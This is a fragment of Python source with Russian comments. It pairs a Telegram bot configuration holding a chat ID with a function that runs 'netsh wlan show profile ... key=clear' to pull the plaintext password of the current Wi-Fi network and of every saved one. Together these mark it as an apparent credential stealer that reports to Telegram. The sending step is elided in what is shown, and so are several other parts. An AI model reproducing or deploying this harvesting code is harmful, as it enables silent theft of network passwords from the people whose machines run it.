...
# Telegram API данные-4619435951
TELEGRAM_CONFIG = {
    "CHAT_ID": "6086449054",
...
def get_wifi_info():
    """
    Собирает информацию о текущей Wi-Fi сети (SSID и пароль) и всех сохранённых профилях.
    Для работы требуется запуск с правами администратора.
    """
    info = {}
    if not is_admin():
    ...
    if current_ssid:
        ...
        for line in current_profile_output.splitlines():
            ...
            if current_password:
                break
        info["Current Wi-Fi"] = {"SSID": current_ssid, "Password": current_password if current_password else "Not found"}
    else:
        info["Current Wi-Fi"] = {"SSID": "Not connected", "Password": "N/A"}
    
    # Поиск сохранённых профилей
    profiles_output = run_command(["netsh", "wlan", "show", "profiles"])
    profiles = []
    # Возможные маркеры для русской и английской локализаций:
    profile_markers = ["All User Profile", "Профиль всех пользователей", "Имя профиля"]
    ...
    for ssid in profiles:
        profile_output = run_command(["netsh", "wlan", "show", "profile", f"name={ssid}", "key=clear"])
        password = None
        for line in profile_output.splitlines():
            ...
            if password:
                break
        saved_networks.append({"SSID": ssid, "Password": password if password else "Not found"})
    info["Saved Wi-Fi Networks"] = saved_networks
    return info
